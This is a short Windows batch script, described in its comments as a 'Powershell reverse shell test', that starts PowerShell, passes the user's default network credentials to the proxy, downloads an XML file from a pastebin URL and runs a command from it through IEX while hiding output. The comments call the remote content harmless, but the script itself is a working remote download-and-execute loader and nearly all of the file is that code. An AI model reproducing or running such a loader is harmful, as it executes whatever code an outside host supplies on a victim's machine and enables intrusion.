@echooff 
rem Powershell reverse shell test, this script will execute a command from a remote xml file on pastebin "https://pastebin.com/raw.php?i=QMyzE3cc".
rem The content of the xml file is not malicious and is for testing purposes only.
rem Written by: Thomas Peterson 03/2019
rem 
CLS
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "$download = New-Object System.Net.WebClient; $download.Headers.Add('User-Agent','Mozilla/4.0+'); $download.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; [xml]$xml = $download.DownloadString('https://pastebin.com/raw.php?i=QMyzE3cc'); Clear-Host; IEX $xml.command.a.execute | out-null" 
EXIT
